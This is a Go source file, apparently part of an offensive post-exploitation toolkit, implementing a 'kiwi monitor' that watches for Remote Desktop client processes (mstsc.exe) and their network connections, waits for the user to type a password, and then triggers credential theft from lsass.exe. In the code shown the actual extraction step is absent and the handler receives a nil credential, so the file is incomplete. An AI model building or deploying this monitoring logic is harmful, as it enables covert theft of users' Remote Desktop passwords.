// +build windows

package kiwimon

import (
	"context"
	"sync"
	"time"

	"github.com/pkg/errors"

	"project/internal/logger"
	"project/internal/module/netmon"
	"project/internal/module/taskmgr"
	"project/internal/module/windows/kiwi"
	"project/internal/nettool"
	"project/internal/xpanic"
	"project/internal/xsync"
)

// DefaultStealWaitTime is the wait time to steal password that find mstsc.exe
// process and establish connection.
const DefaultStealWaitTime = 15 * time.Second

// Handler is used to receive stolen credential.
type Handler func(local, remote string, pid int64, cred *kiwi.Credential)

// Monitor is used to watch password mstsc from, if mstsc.exe is created and
// establish connection, then wait some second for wait user input password,
// finally, use kiwi to steal password from lsass.exe
type Monitor struct {
	logger        logger.Logger
	handler       Handler
	stealWaitTime time.Duration

	processMonitor *taskmgr.Monitor
	connMonitor    *netmon.Monitor

	// key is PID
	watchPIDList    map[int64]struct{}
	watchPIDListRWM sync.RWMutex

	mu sync.Mutex

	ctx     context.Context
	cancel  context.CancelFunc
	counter xsync.Counter
}

// Options contains options about monitor.
type Options struct {
	StealWaitTime          time.Duration
	ProcessMonitorInterval time.Duration
	ConnMonitorInterval    time.Duration
}

// NewMonitor is used to create a new kiwi monitor.
func NewMonitor(logger logger.Logger, handler Handler, opts *Options) (*Monitor, error) {
	if opts == nil {
		opts = new(Options)
	}
	monitor := Monitor{
		logger:        logger,
		handler:       handler,
		stealWaitTime: opts.StealWaitTime,
		watchPIDList:  make(map[int64]struct{}),
	}
	if monitor.stealWaitTime == 0 {
		monitor.stealWaitTime = DefaultStealWaitTime
	}
	monitor.ctx, monitor.cancel = context.WithCancel(context.Background())
	// initialize process monitor
	processMonitor, err := taskmgr.NewMonitor(logger, monitor.processMonitorHandler)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to create process monitor")
	}
	if opts.ProcessMonitorInterval != 0 {
		processMonitor.SetInterval(opts.ProcessMonitorInterval)
	}
	// initialize connection monitor
	connMonitor, err := netmon.NewMonitor(logger, monitor.connMonitorHandler, nil)
	if err != nil {
		processMonitor.Close()
		return nil, errors.WithMessage(err, "failed to create connection monitor")
	}
	if opts.ConnMonitorInterval != 0 {
		connMonitor.SetInterval(opts.ConnMonitorInterval)
	}
	// prevent watch connection first
	interval := processMonitor.GetInterval()
	if connMonitor.GetInterval() < interval {
		connMonitor.SetInterval(interval)
	}
	// set struct fields
	monitor.processMonitor = processMonitor
	monitor.connMonitor = connMonitor
	return &monitor, nil
}

func (mon *Monitor) log(lv logger.Level, log ...interface{}) {
	mon.logger.Println(lv, "kiwi monitor", log...)
}

func (mon *Monitor) processMonitorHandler(_ context.Context, event uint8, data interface{}) {
	switch event {
	case taskmgr.EventProcessCreated:
		mon.watchPIDListRWM.Lock()
		defer mon.watchPIDListRWM.Unlock()
		for _, process := range data.([]*taskmgr.Process) {
			if process.Name == "mstsc.exe" {
				mon.watchPIDList[process.PID] = struct{}{}
			}
		}
	case taskmgr.EventProcessTerminated:
		mon.watchPIDListRWM.Lock()
		defer mon.watchPIDListRWM.Unlock()
		for _, process := range data.([]*taskmgr.Process) {
			if process.Name == "mstsc.exe" {
				delete(mon.watchPIDList, process.PID)
			}
		}
	}
}

func (mon *Monitor) connMonitorHandler(_ context.Context, event uint8, data interface{}) {
	if event != netmon.EventConnCreated {
		return
	}
	mon.watchPIDListRWM.RLock()
	defer mon.watchPIDListRWM.RUnlock()
	for _, conn := range data.([]interface{}) {
		var (
			pid    int64
			local  string
			remote string
		)
		switch conn := conn.(type) {
		case *netmon.TCP4Conn:
			pid = conn.PID
			if _, ok := mon.watchPIDList[pid]; !ok {
				continue
			}
			local = nettool.JoinHostPort(conn.LocalAddr.String(), conn.LocalPort)
			remote = nettool.JoinHostPort(conn.RemoteAddr.String(), conn.RemotePort)
		case *netmon.TCP6Conn:
			pid = conn.PID
			if _, ok := mon.watchPIDList[pid]; !ok {
				continue
			}
			local = nettool.JoinHostPort(conn.LocalAddr.String(), conn.LocalPort)
			remote = nettool.JoinHostPort(conn.RemoteAddr.String(), conn.RemotePort)
		}
		if pid != 0 {
			mon.counter.Add(1)
			go mon.stealCredential(local, remote, pid)
		}
	}
}

func (mon *Monitor) stealCredential(local, remote string, pid int64) {
	defer mon.counter.Done()
	defer func() {
		if r := recover(); r != nil {
			mon.log(logger.Fatal, xpanic.Print(r, "Monitor.stealCredential"))
		}
	}()
	// wait user input password
	timer := time.NewTimer(mon.stealWaitTime)
	defer timer.Stop()
	select {
	case <-timer.C:
	case <-mon.ctx.Done():
		return
	}
	// steal credential

	mon.handler(local, remote, pid, nil)
}

// Close is used to close kiwi monitor.
func (mon *Monitor) Close() {
	mon.cancel()
	mon.mu.Lock()
	defer mon.mu.Unlock()
	if mon.processMonitor != nil {
		mon.processMonitor.Close()
		mon.processMonitor = nil
	}
	if mon.connMonitor != nil {
		mon.connMonitor.Close()
		mon.connMonitor = nil
	}
	mon.counter.Wait()
}
